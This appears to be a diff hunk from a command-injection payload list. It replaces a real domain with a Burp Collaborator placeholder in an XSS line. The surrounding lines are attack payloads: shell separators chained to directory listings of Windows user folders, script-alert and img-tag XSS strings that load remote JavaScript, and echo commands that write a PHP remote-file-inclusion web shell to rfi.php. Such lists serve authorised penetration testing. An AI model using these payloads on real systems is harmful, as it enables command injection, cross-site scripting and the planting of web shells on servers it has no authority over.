@@ -57,7 +57,7 @@ dir C:\Documents and Settings\*
 && dir C:\Users
 dir C:\Users
 ;echo%20'<script>alert(1)</script>'
-echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+echo '<img src=https://<BURP_COLLAB>.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
 | echo "<?php include($_GET['page'])| ?>" > rfi.php
 ; echo "<?php include($_GET['page']); ?>" > rfi.php
 & echo "<?php include($_GET['page']); ?>" > rfi.php
